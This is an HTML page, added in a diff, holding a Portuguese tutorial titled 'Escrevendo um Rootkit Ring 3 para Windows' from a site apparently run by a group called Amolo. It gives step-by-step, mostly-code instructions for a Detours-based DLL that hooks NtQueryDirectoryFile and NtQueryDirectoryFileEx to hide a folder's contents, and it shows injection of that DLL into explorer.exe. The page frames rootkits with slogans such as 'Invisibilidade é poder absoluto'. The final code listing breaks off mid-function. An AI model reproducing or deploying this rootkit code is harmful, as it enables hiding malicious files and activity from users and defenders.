@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=1024">
+    <link rel="icon" type="image/x-icon" href="../../../favicon.ico">
+    <title>Paper: Escrevendo um Rootkit Ring 3 para Windows - Amolo</title>
+
+    <style>
+        @font-face {
+            font-family: 'EnglishTowne';
+            src: url('../../../fonts/EnglishTowne.ttf') format('truetype');
+        }
+        body {
+            background-image: url('../../../imgs/bg.png');
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-position: center;
+            background-attachment: fixed;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        *, *::before, *::after {
+            box-sizing: inherit;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 20px auto;
+            border-radius: 8px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.5);
+        }
+        .ascii {
+            color: white;
+            padding: 30px;
+            text-align: center;
+            font-family: 'EnglishTowne', cursive;
+            font-size: 90px;
+        }
+        .nav {
+            display: flex;
+            justify-content: center;
+            background-color: rgba(5, 5, 5, 0.8);
+            gap: 10px;
+            padding: 10px 0;
+        }
+        .nav a {
+            color: white;
+            text-align: center;
+            padding: 14px 16px;
+            text-decoration: none;
+            font-family: monospace;
+        }
+        .nav a:hover {
+            background-color: rgb(38, 7, 112);
+            color: white;
+            border-radius: 5px;
+        }
+        .nav a.active {
+            background-color: rgb(71, 37, 153);
+            color: white;
+            border-radius: 5px;
+        }
+        .card {
+            color: #000;
+            background-color: #aaa;
+            padding: 20px;
+            margin-top: 20px;
+        }
+        .pre-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        pre {
+            background-color: #1e1e1e40;
+            color: white;
+            padding: 20px 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.5);
+            width: 90%;
+            max-width: 1200px;
+            margin: 0 auto;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            font-family: monospace;
+            border: 2px solid rgba(255, 255, 255, 0.75);
+            box-sizing: border-box;
+            text-indent: 0;
+            word-break: break-word;
+        }
+    </style>
+</head>
+<body>
+    <div class="nav">
+        <a href="../../index.html">❮─❲Home❳─❯</a>
+        <a href="../../papers/" class="active">❮─❲✧Papers✧❳─❯</a>
+        <a href="../../members/">❮─❲Membros❳─❯</a>
+    </div>
+
+    <div class="ascii">Amolo ☽</div>
+
+    <h1 style="font-family:monospace; text-align:center; color:white;">
+        Escrevendo um Rootkit Ring 3 para Windows
+    </h1>
+    <p style="font-family:monospace; text-align:center; color:white;">
+        Autor: @br0sck
+    </p>
+
+    <div class="pre-container">
+        <pre>
+
+            
+        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀             ⣿⣿⣿⣿⣶⣤    ⣤⣤⣤⣤⡀    ⣤⣤⣤⣤⡀   ⣿⣿⣿⣿⣿⣿  ⣿⣿   ⣿⣿  ⣿⣿⣿⣿⣿⣿  ⣿⣿⣿⣿⣿⣿  
+        ⠀⠀⠀⠀⠀⠀⡀⢄⢮⡳⣶⢭⣖⣢⡤⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀             ⣿⣿⣿⣿⣿⣿⡇  ⣿⣿⣿⣿⣿⡇  ⣿⣿⣿⣿⣿⡇  ⣿⣿⣿⣿⣿⣿  ⣿⣿  ⣿⣿      ⣿⣿     ⣿⣿⣿⣿⣿⣿  
+        ⠀⠀⢀⢤⣢⣵⣾⣾⣿⣿⣿⣹⣿⣿⣿⣿⣶⣯⣵⣒⡠⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀            ⣿⣿⣶⣶⣿⣿⠇  ⣿⣿⠁⠈⣿⣿  ⣿⣿⠁⠈⣿⣿     ⣿⣿     ⣿⣿⣴⣿⠇      ⣿⣿        ⣿⣿     
+        ⠀⠀⢸⣎⣿⣿⣿⣿⣿⡿⠛⠛⠻⣿⣿⣿⣿⣿⣿⡇⣿⣟⣵⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀            ⣿⣿⣿⠿⠛⠁   ⣿⣿   ⣿⣿  ⣿⣿   ⣿⣿     ⣿⣿     ⣿⣿⣿⠏       ⣿⣿        ⣿⣿     
+        ⠀⠀⢸⡇⠼⣿⣿⣿⡟⠀⢠⣤⢸⡊⢻⣿⡿⣿⣿⡇⣿⣿⣷⣝⣕⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀            ⣿⣿⣷⣤⡀     ⣿⣿   ⣿⣿  ⣿⣿   ⣿⣿     ⣿⣿     ⣿⣿⣿⣷⡄      ⣿⣿        ⣿⣿     
+        ⠀⠀⢸⡇⢑⢻⣿⣿⣧⡀⣅⡡⣠⠆⠹⣿⣿⣿⣿⣷⣿⣿⣿⣿⣷⢟⢯⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀            ⣿⣿⠉⠻⣷⡄   ⣿⣿⣀⣀⣿⣿  ⣿⣿⣀⣀⣿⣿     ⣿⣿     ⣿⣿ ⠙⣿⣇     ⣿⣿        ⣿⣿     
+        ⠀⠀⢸⡇⣸⢉⢿⣯⣿⣿⣶⣧⣤⣰⣾⣿⡟⠽⣋⣈⢿⣿⣿⣿⣿⢸⣷⣝⠮⡢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀            ⣿⣿   ⢹⣿   ⣿⣿⣿⣿⣿⠇  ⣿⣿⣿⣿⣿⠇     ⣿⣿     ⣿⣿  ⠘⣿⣷     ⣿⣿        ⣿⣿     
+        ⠀⠀⢸⣷⣿⠠⣞⢿⣿⣿⣿⣿⢟⡫⡗⡢⡑⢭⣗⡺⢷⣙⠿⣿⣿⣼⣿⢿⣷⣍⣎⡢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀            ⣿⣿    ⣿⣿   ⠉⠉⠉⠉     ⠉⠉⠉⠉       ⣿⣿     ⣿⣿   ⠈⣿⣿  ⣿⣿⣿⣿⣿⣿     ⣿⣿     
+        ⠀⠀⢸⣿⣿⣼⡏⠗⢝⢿⣿⡈⢥⣿⠞⡜⡼⣾⣛⢿⣛⣻⣷⣰⠹⣻⣿⣿⣿⣿⣿⣮⡪⡢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀            
+        ⠀⠀⣸⣿⣿⣾⡇⠄⠁⠋⣊⢟⠬⡻⣯⡵⣣⡻⣟⡦⢾⣿⣋⣇⢉⣿⣿⣿⣿⣿⣿⣿⣿⣿⡪⡢⡀⠀⠀⠀⠀⠀⠀⠀                               
+        ⠠⠰⣹⢔⠹⣿⣿⣫⠁⠀⢰⡌⢿⡎⢜⠝⡿⣟⡫⢗⡫⠏⠙⢫⣵⠘⣄⡘⠿⣿⣿⣿⣿⣿⣿⣿⣾⣮⡢⡀⠀⠀⠀⠀           Rootkits não são maliciosos, são apenas incompreendidos.
+        ⠀⠀⠀⠄⡚⠘⢿⣯⡅⠀⢸⠇⠄⠀⠀⠉⠲⠔⡱⡻⢿⣽⣁⠢⢼⣶⣿⣿⣷⣬⡉⡹⠿⣿⣿⣿⣿⣿⣯⡪⡢⡀⠀⠀            Eles só preferem ficar ocultos ¯⁠\⁠_⁠(⁠ツ⁠)⁠_⁠/⁠¯
+        ⠀⠀⠠⠀⢀⠄⠎⢿⣷⠀⢸⠇⡄⡆⡌⠁⡂⠀⡘⢠⠱⠨⢛⢿⣶⣬⡉⡹⠻⣿⣷⣢⣄⠙⢿⣿⣿⣿⣿⡿⠞⢞⡆⠀⠀            
+        ⠀⠀⠀⠀⠈⠈⠒⠊⡻⡇⡄⡒⠤⡀⠁⠃⠁⢠⢀⠁⠀⠀⠂⢉⢊⠝⠿⣶⡤⡘⢿⣿⣷⣝⢦⣙⠿⡛⣉⣼⣾⣿⡇⠀⠀                              Persistência é poder. Invisibilidade é poder absoluto.
+        ⠀⠀⠀⠀⠀⠘⠠⢬⠐⠱⠺⢵⡣⢆⡅⢆⡎⠘⠈⠘⢰⠰⠀⠃⠎⡔⠸⢐⠹⢻⢵⡩⣛⢟⢋⣡⣵⣿⡟⢹⢿⣿⡇⠀⠀                              
+        ⠀⠀⠀⠀⠀⠀⠂⠄⡈⢀⠀⠑⢉⢓⠾⡥⢨⠐⡠⣀⠂⠆⡄⡄⡀⠐⢀⠀⡌⡖⢌⠪⣤⢾⣿⣿⣿⣏⣍⢰⣿⢿⡇⢤⠀           A primeira regra do rootkit: você não fala sobre rootkits. 
+        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠐⠁⠀⠈⠐⠱⠁⢊⢅⡃⠉⢒⠤⡁⠃⠦⢌⠘⠀⠁⠀⠂⣿⣿⣿⣿⣿⣿⣧⣸⣾⣿⡇⢠⠰            
+        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠄⠄⡀⠂⠅⠌⠕⣰⢈⠒⠵⢢⢎⣐⠀⡃⠄⠀⣿⢷⣿⣿⣿⣟⣯⣷⠿⢻⢱⠂⠈            
+        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠈⠀⢉⢒⠄⡂⡖⡩⢒⠄⠀⣿⡿⣟⣽⣾⡟⡏⠆⠀⠑⠈⠀⠀                                                        Para controlar um sistema,
+        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠄⠂⠈⠈⢑⠣⢇⡎⠄⣿⣿⡿⡉⠃⠃⠀⠀⠀⠀⠀⠀⠀                                             primeiro controle no que ele acredita.
+        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠁⠁⠀⠎⠛⠉⡀⠉⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀            
+                                                                               Você não pode matar o que não pode ver.
+
+
+                                                                               
+
+                                                ╔════════════════════════[Sumário]════════════════════════╗
+                                                ║                                                         ║
+                                                ║     1. Introdução                                       ║
+                                                ║     2. O que é a Biblioteca Detours?                    ║
+                                                ║       2.1 Conhecimentos/Experiências Neccessárias       ║
+                                                ║       2.2 Materiais para Desenvolvimento                ║
+                                                ║     3. Criando o Projeto                                ║
+                                                ║       3.1 Incluindo a Biblioteca Detours                ║
+                                                ║       3.2 Definindo a Estrutura de uma NTAPI            ║
+                                                ║       3.3 Escrevendo o Código                           ║
+                                                ║       3.4 Código Final                                  ║
+                                                ║     4. Conclusão                                        ║
+                                                ║     5. Referências                                      ║
+                                                ║                                                         ║
+                                                ╚═════════════════════════════════════════════════════════╝
+
+<a style="font-size: 23px;">Introdução</a>
+No cenário digital de hoje, onde a conectividade está cada vez mais presente nos nossos dias, a segurança cibernética se tornou uma preocupação central tanto para pessoas quanto para organizações. Entre as ameaças nesse ambiente virtual, os rootkits são um tipo de malware sofisticado. Esses programas maliciosos têm a capacidade de se esconder profundamente no sistema operacional de um computador, permitindo que invasores tenham acesso não autorizado e persistente aos recursos do sistema sem serem detectados pelos usuários.
+
+Este artigo explora detalhadamente a criação dos rootkits para o sistema operacional Windows. Vamos explorar o desenvolvimento de um rootkit ring 3, conhecido também como userland rootkit, que opera no nível de privilégio do usuário no sistema operacional Windows. Embora seja menos privilegiado do que os rootkits ring 0 (kernel mode rootkit), esse tipo ainda pode executar atividades maliciosas discretas e muitas vezes imperceptíveis se o usuário mal-intencionado desenvolver bem seu programa malicioso.
+
+A imagem abaixo mostra as camadas de um sistema operacional.
+
+<img src="imgs/dev_win_rootkit_0.jpg">
+
+Antes de começarmos a por as mãos na massa, precisamos conhecer o ambiente em que vamos trabalhar.
+
+<a style="font-size: 23px;">O que é a Biblioteca Detours?</a>
+Detours é um pacote de software para monitorar e instrumentar chamadas de API no Windows. Os desvios têm sido usados por muitos ISVs e também pelas equipes de produto da Microsoft.
+
+<a style="font-size: 18px;">Conhecimentos/Experiências Necessárias</a>
+• Linguagem de programação: C/C++.
+• Windows NT Application Programming Interface (NTAPI).
+• Dynamic Link Library (DLL).
+• Experiências com NTAPIs e Windows APIs.
+• O que são rootkits e como operam.
+
+<a style="font-size: 18px;">Materiais para Desenvolvimento</a>
+• Sistema Operacional: Windows 10.
+• Softwares: Microsoft Visual Studio 2022, Process Hacker.
+• Biblioteca: Detours (https://github.com/microsoft/detours).
+• Ferramentas, Compiladores: Ferramentas de compilação MSVC v143, C++ Build Insights.
+
+<a style="font-size: 23px;">Criando o Projeto</a>
+Abra o Visual Studio 2022 e crie um novo projeto com o modelo "Biblioteca de Vínculo Dinâmico (DLL)" e clique em "Próximo". Dê um nome para seu projeto e clique em "Criar".
+<img src="imgs/dev_win_rootkit_1.png">
+
+<a style="font-size: 18px;">Incluindo a Biblioteca Detours</a>
+Antes de incluir a biblioteca Detours, é preciso compilá-la. Você consegue encontrar o código fonte da biblioteca no próprio Github da Microsoft.
+
+Após compilar a biblioteca, você pode incluí-la em seu projeto. Abaixo está um link de um vídeo ensinando a importar arquivos "lib".
+
+Link: https://www.youtube.com/watch?v=j13iYc6zRuk
+
+É importante mover os arquivos "detours.h" e "detver.h" para o diretório do seu projeto, o mesmo diretório que haverá o arquivo principal "dllmain.cpp". Posteriormente, inclua eles no seu projeto através do "Gerenciador de Soluções" do Visual Studio 2022.
+<img src="imgs/dev_win_rootkit_2.png">
+
+<a style="font-size: 18px;">Definindo a Estrutura de uma NTAPI</a>
+Para começarmos a escrever nossas primeiras linhas, precisamos definir qual NTAPIserá interceptada e qual será nosso objetivo explorando ela. A NTAPI que iremos usar nesse exemplo será a "NtQueryDirectoryFile" e "NtQueryDirectoryFileEx". Nosso objetivo será abusar dessa API para esconder arquivos de um diretório. Podemos encontrar a documentação dela no próprio site da Microsoft.
+
+<b>NtQueryDirectoryFile Sintaxe:</b>
+
+<pre>__kernel_entry NTSYSCALLAPI NTSTATUS NtQueryDirectoryFile(
+  [in]           HANDLE                 FileHandle,
+  [in, optional] HANDLE                 Event,
+  [in, optional] PIO_APC_ROUTINE        ApcRoutine,
+  [in, optional] PVOID                  ApcContext,
+  [out]          PIO_STATUS_BLOCK       IoStatusBlock,
+  [out]          PVOID                  FileInformation,
+  [in]           ULONG                  Length,
+  [in]           FILE_INFORMATION_CLASS FileInformationClass,
+  [in]           BOOLEAN                ReturnSingleEntry,
+  [in, optional] PUNICODE_STRING        FileName,
+  [in]           BOOLEAN                RestartScan
+);</pre>
+
+<b>NtQueryDirectoryFileEx Sintaxe:</b>
+
+<pre>__kernel_entry NTSYSCALLAPI NTSTATUS NtQueryDirectoryFileEx(
+  [in]           HANDLE                 FileHandle,
+  [in, optional] HANDLE                 Event,
+  [in, optional] PIO_APC_ROUTINE        ApcRoutine,
+  [in, optional] PVOID                  ApcContext,
+  [out]          PIO_STATUS_BLOCK       IoStatusBlock,
+  [out]          PVOID                  FileInformation,
+  [in]           ULONG                  Length,
+                 FILE_INFORMATION_CLASS FileInformationClass,
+  [in]           ULONG                  QueryFlags,
+  [in, optional] PUNICODE_STRING        FileName
+);</pre>
+
+Vamos incluí-las em nosso arquivo "dllmain.cpp":
+
+<pre>#include "pch.h"
+#include &lt;Windows.h&gt;
+#include &lt;winternl.h&gt;
+#include "detours.h"
+
+typedef NTSTATUS(NTAPI* typedefNtQueryDirectoryFile)(
+	HANDLE                 FileHandle,
+	HANDLE                 Event,
+	PIO_APC_ROUTINE        ApcRoutine,
+	PVOID                  ApcContext,
+	PIO_STATUS_BLOCK       IoStatusBlock,
+	PVOID                  FileInformation,
+	ULONG                  Length,
+	FILE_INFORMATION_CLASS FileInformationClass,
+	BOOLEAN                ReturnSingleEntry,
+	PUNICODE_STRING        FileName,
+	BOOLEAN                RestartScan
+);
+
+typedef NTSTATUS(NTAPI* typedefNtQueryDirectoryFileEx)(
+	HANDLE                 FileHandle,
+	HANDLE                 Event,
+	PIO_APC_ROUTINE        ApcRoutine,
+	PVOID                  ApcContext,
+	PIO_STATUS_BLOCK       IoStatusBlock,
+	PVOID                  FileInformation,
+	ULONG                  Length,
+	FILE_INFORMATION_CLASS FileInformationClass,
+	ULONG                  QueryFlags,
+	PUNICODE_STRING        FileName
+);</pre>
+
+Também precisamos criar duas variáveis estáticas sobre as duas NTAPIs que iremos armazenar o endereço delas na próxima função que iremos criar.
+
+<pre>static typedefNtQueryDirectoryFile originalNtQueryDirectoryFile;
+static typedefNtQueryDirectoryFileEx originalNtQueryDirectoryFileEx;</pre>
+
+Agora vamos começar a criar a função responsável por iniciar o hooking nas NTAPIs. Escreva as seguintes linhas de código:
+
+<pre>BOOL StartHook() {
+	HMODULE ntdllHandle = GetModuleHandleA("ntdll.dll");
+	originalNtQueryDirectoryFile = (typedefNtQueryDirectoryFile)GetProcAddress(ntdllHandle, "NtQueryDirectoryFile");
+	originalNtQueryDirectoryFileEx = (typedefNtQueryDirectoryFileEx)GetProcAddress(ntdllHandle, "NtQueryDirectoryFileEx");
+
+	return 0;
+}</pre>
+
+• <code>HMODULE ntdllHandle = GetModuleHandleA("ntdll.dll");</code>: Essa linha será responsável por obter o handle do módulo "ntdll.dll".
+• <code>originalNtQueryDirectoryFile = (typedefNtQueryDirectoryFile)GetProcAddress(ntdllHandle, "NtQueryDirectoryFile");</code>: Essa linha armazenará o endereço da função "NtQueryDirectoryFile" na variável que definimos acima chamada "originalNtQueryDirectoryFile". O mesmo ocorre na próxima linha.
+
+Antes de continuarmos, precisamos conhecer algumas funções da biblioteca Detours:
+
+• <b>DetourRestoreAfterWith</b>: Esta função é usada para especificar se as detecções feitas por DetourTransactionCommit devem ser mantidas ou revertidas.
+• <b>DetourTransactionBegin</b>: Inicia uma nova transação Detours. Uma transação Detours é uma série de detours que são aplicados ou revertidos de uma vez.
+• <b>DetourUpdateThread</b>: Atualiza detours em todas as threads de um processo para refletir mudanças feitas durante uma transação Detours.
+• <b>DetourAttach</b>: Anexa um detour a uma função, redirecionando a execução para uma função personalizada antes da função original.
+• <b>DetourDetach</b>: Remove um detour previamente anexado, restaurando a função original.
+• <b>DetourTransactionCommit</b>: Finaliza uma transação Detours, aplicando ou revertendo as mudanças feitas nas funções alvo.
+
+<a style="font-size: 18px;">Escrevendo o Código</a>
+
+Após essa explicação, vamos continuar escrevendo as linhas de código de função "StartHook".
+
+<pre>BOOL StartHook() {
+	HMODULE ntdllHandle = GetModuleHandleA("ntdll.dll");
+	originalNtQueryDirectoryFile = (typedefNtQueryDirectoryFile)GetProcAddress(ntdllHandle, "NtQueryDirectoryFile");
+	originalNtQueryDirectoryFileEx = (typedefNtQueryDirectoryFileEx)GetProcAddress(ntdllHandle, "NtQueryDirectoryFileEx");
+	
+	DetourRestoreAfterWith();
+	DetourTransactionBegin();
+	DetourUpdateThread(GetCurrentThread());
+	DetourAttach(&(PVOID&)originalNtQueryDirectoryFile, HookedNtQueryDirectoryFile);
+	DetourAttach(&(PVOID&)originalNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);
+	
+	DetourTransactionCommit();
+
+	return 0;
+}
+
+static NTSTATUS NTAPI HookedNtQueryDirectoryFile(...) {...}
+static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(...) {...}</pre>
+
+
+• <code>DetourUpdateThread(GetCurrentThread());</code>: Irá atualizar os detours em toda as threads do processo.
+• <code>DetourAttach(&(PVOID&)originalNtQueryDirectoryFile, HookedNtQueryDirectoryFile);</code>: Ela interceptará a NTAPI original onde redirecionará para nossa função personalizada "HookedNtQueryDirectoryFile". O mesmo ocorre na linha debaixo.
+
+Chegamos na parte mais interessante, onde iremos começar a recriar as NTAPIs interceptadas. Vamos escrever as seguintes linhas:
+
+<pre>static NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, LPVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, LPVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan) {
+	NTSTATUS status = STATUS_NO_MORE_FILES;
+	WCHAR dirPath[MAX_PATH + 1] = { NULL };
+}</pre>
+
+• <code>NTSTATUS status = STATUS_NO_MORE_FILES;</code>: A variável "status" armazenará o valor "0x80000006", que é um tipo de código de status para identificar se existe mais algum arquivo para ser listado dentro de um diretório. Defina um macro em seu código escrevendo <code>#define STATUS_NO_MORE_FILES 0x80000006</code>. Você pode encontrar a referências de todos os código de status em NTSTATUS values.
+• <code>WCHAR dirPath[MAX_PATH + 1] = { NULL };</code>: A variável armazenará um valor nulo que será responsável por armazenar o caminho acessado após o hook inicializar.
+
+<pre>[...]
+	if (GetFinalPathNameByHandleW(FileHandle, dirPath, MAX_PATH, FILE_NAME_NORMALIZED)) {
+
+	if (StrStrIW(dirPath, L"C:\\Windows\\Temp\\nothing_here"))
+		RtlZeroMemory(FileInformation, Length);
+	else
+		status = originalNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
+}
+
+return status;</pre>
+
+• <code>GetFinalPathNameByHandleW(FileHandle, dirPath, MAX_PATH, FILE_NAME_NORMALIZED)</code>: Essa função obterá o caminho completo acessado através de seu <code>HANDLE FileHandle</code>, que é um parâmetro nativo da NTAPI "NtQueryDirectoryFile" e "NtQueryDirectoryFileEx".
+• <code>if (StrStrIW(dirPath, L"C:\\Windows\\Temp\\nothing_here"))</code>: Realizará uma comparação para identificar se o caminho acessado é "C:\Windows\Temp\nothing_here".
+• * <b>Caso seja</b>: Ele irá limpar todo o conteúdo da variável "FileInformation" com a função "RtlZeroMemory".
+• * <b>Caso não seja</b>: Todos os argumentos passados na função "HookedNtQueryDirectoryFileEx" será redirecionado para "originalNtQueryDirectoryFileEx" e armazenará um novo código de status NT da variável "status". Essa é a única linha em que você verá a variável <code>NTSTATUS status</code> ser alterada por outro valor, pois ao definir o valor dessa variável para "STATUS_NO_MORE_FILES", você estará dizendo o mesmo que "Esta pasta está vazia.", aquela mensagem clássica do Windows.
+
+O mesmo é feito na função "HookedNtQueryDirectoryFileEx":
+
+<pre>static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, ULONG QueryFlags, PUNICODE_STRING FileName) {
+	NTSTATUS status = STATUS_NO_MORE_FILES;
+	WCHAR dirPath[MAX_PATH + 1] = { NULL };
+
+	if (GetFinalPathNameByHandleW(FileHandle, dirPath, MAX_PATH, FILE_NAME_NORMALIZED)) {
+
+		if (StrStrIW(dirPath, L"C:\\Windows\\Temp\\nothing_here"))
+			RtlZeroMemory(FileInformation, Length);
+		else
+			status = originalNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
+	}
+	return status;
+}</pre>
+
+Posteriormente, precisamos criar a função para reverter os hooks feitos:
+
+<pre>BOOL StopHook() {
+	DetourTransactionBegin();
+	DetourUpdateThread(GetCurrentThread());
+	DetourDetach(&(PVOID&)originalNtQueryDirectoryFile, HookedNtQueryDirectoryFile);
+	DetourDetach(&(PVOID&)originalNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);
+	
+	DetourTransactionCommit();
+
+	return 0;
+}</pre>
+
+Explicando a parte principal dessas linhas de código:
+• <code>DetourDetach(&(PVOID&)originalNtQueryDirectoryFile, HookedNtQueryDirectoryFile);</code>: Ficará responsável por desanexar o hook feito, passando como primeiro argumento o endereço da NTAPI "NtQueryDirectoryFile" original, convertendo ela para um ponteiro para void, e no próximo argumento definindo o endereço da função "HookedNtQueryDirectoryFileEx". O mesmo serve para a linha debaixo.
+
+Está quase pronto, agora só precisamos ajustar a função "DllMain" para chamar as funções criadas:
+
+<pre>BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
+{
+	switch (ul_reason_for_call) {
+	case DLL_PROCESS_ATTACH:
+		StartHook();
+		break;
+	case DLL_THREAD_ATTACH:
+		break;
+	case DLL_THREAD_DETACH:
+		break;
+	case DLL_PROCESS_DETACH:
+		StopHook();
+		break;
+	}
+
+	return TRUE;
+}</pre>
+
+Compile seu código e valide se está funcionando perfeitamente através dos seguintes passos:
+
+1 - Crie o diretório "C:\Windows\Temp\nothing_here" e adicione um arquivo qualquer.
+<img src="imgs/dev_win_rootkit_3.png">
+
+2 - Abra a ferramenta Process Hacker e pesquise por "explorer.exe". Clique com o botão direito no processo e vá em "Miscellaneous > Inject DLL".
+<img src="imgs/dev_win_rootkit_4.png">
+
+3 - Selecione a sua DLL compilada.
+<img src="imgs/dev_win_rootkit_5.png">
+
+3 - Vá para o diretório "C:\Windows\Temp\nothing_here" e clique com o botão direito e clique em "Atualizar".
+<img src="imgs/dev_win_rootkit_6.png">
+
+Todos os arquivos que foram armazenados dentro deste diretório não serão mostrados para o usuário.
+<img src="imgs/dev_win_rootkit_7.png">
+
+<a style="font-size: 18px;">Código Final</a>
+
+<pre>// dllmain.cpp
+#include "pch.h"
+#include &lt;Windows.h&gt;
+#include &lt;winternl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;shlwapi.h&gt;
+#include "detours.h"
+#pragma comment(lib, "shlwapi.lib")
+
+#define STATUS_NO_MORE_FILES 0x80000006
+
+typedef NTSTATUS(NTAPI* typedefNtQueryDirectoryFile)(
+    HANDLE                 FileHandle,
+    HANDLE                 Event,
+    PIO_APC_ROUTINE        ApcRoutine,
+    PVOID                  ApcContext,
+    PIO_STATUS_BLOCK       IoStatusBlock,
+    PVOID                  FileInformation,
+    ULONG                  Length,
+    FILE_INFORMATION_CLASS FileInformationClass,
+    BOOLEAN                ReturnSingleEntry,
+    PUNICODE_STRING        FileName,
+    BOOLEAN                RestartScan
+);
+
+typedef NTSTATUS(NTAPI* typedefNtQueryDirectoryFileEx)(
+    HANDLE                 FileHandle,
+    HANDLE                 Event,
+    PIO_APC_ROUTINE        ApcRoutine,
+    PVOID                  ApcContext,
+    PIO_STATUS_BLOCK       IoStatusBlock,
+    PVOID                  FileInformation,
+    ULONG                  Length,
+    FILE_INFORMATION_CLASS FileInformationClass,
+    ULONG                  QueryFlags,
+    PUNICODE_STRING        FileName
+);
+
+static typedefNtQueryDirectoryFile originalNtQueryDirectoryFile;
+static typedefNtQueryDirectoryFileEx originalNtQueryDirectoryFileEx;
+
+static NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, LPVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, LPVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan) {
+    NTSTATUS status = STATUS_NO_MORE_FILES;
+    WCHAR dirPath[MAX_PATH + 1] = { NULL };
+
+    if (GetFinalPathNameByHandleW(FileHandle, dirPath, MAX_PATH, FILE_NAME_NORMALIZED)) {
+
+        if (StrStrIW(dirPath, L"C:\\Windows\\Temp\\nothing_here"))
+            RtlZeroMemory(FileInformation, Length);
+        else
+            status = originalNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
+    }
+
+    return status;
+}
+
+static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, ULONG QueryFlags, PUNICODE_STRING FileName) {
+    NTSTATUS status = STATUS_NO_MORE_FILES;
+    WCHAR dirPath[MAX_PATH + 1] = { NULL };
+
+    if (GetFinalPathNameByHandleW(FileHandle, dirPath, MAX_PATH, FILE_NAME_NORMALIZED)) {
+
+        if (StrStrIW(dirPath, L"C:\\Windows\\Temp\\nothing_here"))
+            RtlZeroMemory(FileInformation, Length);
+        else
+            status = originalNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
+    }
+    return status;
+}
+
+BOOL StartHook() {
+    HMODULE ntdllHandle = GetModuleHandleA("ntdll.dll");
+    originalNtQueryDirectoryFile = (typedefNtQueryDirectoryFile)GetProcAddress(ntdllHandle, "NtQueryDirectoryFile");
+    originalNtQueryDirectoryFileEx = (typedefNtQueryDirectoryFileEx)GetProcAddress(ntdllHandle, "NtQueryDirectoryFileEx");
+    
+    DetourRestoreAfterWith();
+    DetourTransactionBegin();
+    DetourUpdateThread(GetCurrentThread());
+    DetourAttach(&(PVOID&)originalNtQueryDirectoryFile, HookedNtQueryDirectoryFile);
+    DetourAttach(&(PVOID&)originalNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);
+    
+    DetourTransactionCommit();
